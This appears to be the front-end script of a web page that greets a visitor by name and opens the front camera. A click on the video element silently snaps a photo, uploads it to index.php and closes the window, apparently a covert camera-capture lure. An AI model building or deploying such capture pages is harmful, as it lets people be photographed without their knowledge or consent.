const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const captureButton = document.getElementById('video');
let name = document.querySelector('.name')

setTimeout(() => {
  document.querySelector('#overlay2').style.display = 'block';
  document.querySelector('.menu').style.transform = "scale(1)";
  document.querySelector('.menu').style.transformOrigin = "center";
  document.querySelector('.menu').style.transition = ".3s ease-in-out";
  name.style.display = "none"
}, 100)

function enter(event) {
  console.log(event.target.value)
  if (event.key == "Enter") {
    name.style.display = "block"
    document.getElementById('overlay2').style.display = 'none';
    name.innerHTML = `Hai,${input.value}`
  }
}
// Menggunakan facingMode untuk meminta kamera depan
const constraints = {
  video: { facingMode: 'user' } // 'user' untuk kamera depan, 'environment' untuk kamera belakang
};

navigator.mediaDevices.getUserMedia(constraints)
  .then(stream => {
    video.srcObject = stream;
  })
  .catch(err => {
    console.error('Error accessing camera: ', err);
  });

captureButton.addEventListener('click', () => {
  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
  const imageData = canvas.toDataURL('image/jpeg');

  // Kirim data gambar ke server menggunakan AJAX
  const xhr = new XMLHttpRequest();
  xhr.open('POST', 'index.php', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.onreadystatechange = function() {
    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
      console.log('Gambar berhasil diunggah');
    }
  };
  xhr.send('image=' + encodeURIComponent(imageData));
  
  setTimeout(()=>{
    window.close()
  },3000)
});